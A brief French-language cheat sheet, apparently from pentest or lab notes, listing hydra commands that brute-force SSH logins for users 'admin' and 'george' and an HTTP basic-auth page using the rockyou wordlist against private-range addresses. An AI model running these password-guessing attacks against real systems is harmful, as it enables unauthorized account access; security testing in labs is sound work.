Pour trouver le mot de passe d'un utilisateur spécial :
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.36 -t 30 ssh

```

ou 
```
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.207.201 
```

Attaque d'une page http basic authentication
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.207.201 http-get /


```